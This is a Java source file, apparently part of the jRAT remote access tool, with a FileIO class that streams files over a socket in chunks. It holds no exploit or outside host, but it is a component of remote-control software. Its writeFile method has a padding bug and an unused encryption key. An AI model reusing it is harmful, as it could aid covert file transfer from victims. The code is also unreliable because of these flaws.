package su.jrat.common.io;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.Socket;

public class FileIO {

	public static final int CHUNKSIZE = 1024;

	public boolean enabled = true;

	public void writeFile(File file, Socket socket, DataOutputStream dos, DataInputStream dis, TransferListener listener, byte[] key) throws Exception {
		int timeout = socket.getSoTimeout();
		socket.setSoTimeout(0);

		FileInputStream fileInput = new FileInputStream(file);

		byte[] chunk = new byte[CHUNKSIZE];

		long fileSize = file.length();
		dos.writeLong(fileSize);

		for (long pos = 0; pos < fileSize; pos += CHUNKSIZE) {
			fileInput.read(chunk);

			dos.writeInt(chunk.length);

			dos.write(chunk, 0, chunk.length);

			if (listener != null) {
				listener.transferred(chunk.length, pos, fileSize);
			}
		}
		fileInput.close();

		dos.writeInt(-1);

		socket.setSoTimeout(timeout);
	}

	public void readFile(File output, Socket socket, DataInputStream dis, DataOutputStream dos, TransferListener listener, byte[] key) throws Exception {
		FileOutputStream fileOutput = new FileOutputStream(output);

		int read = 0;
		int chunkSize;

		long size = dis.readLong();

		while ((chunkSize = dis.readInt()) != -1) {
			byte[] chunk = new byte[chunkSize];

			read += chunkSize;

			dis.readFully(chunk);

			fileOutput.write(chunk);

			if (listener != null) {
				listener.transferred(chunk.length, read, size);
			}
		}

		fileOutput.close();
	}

}
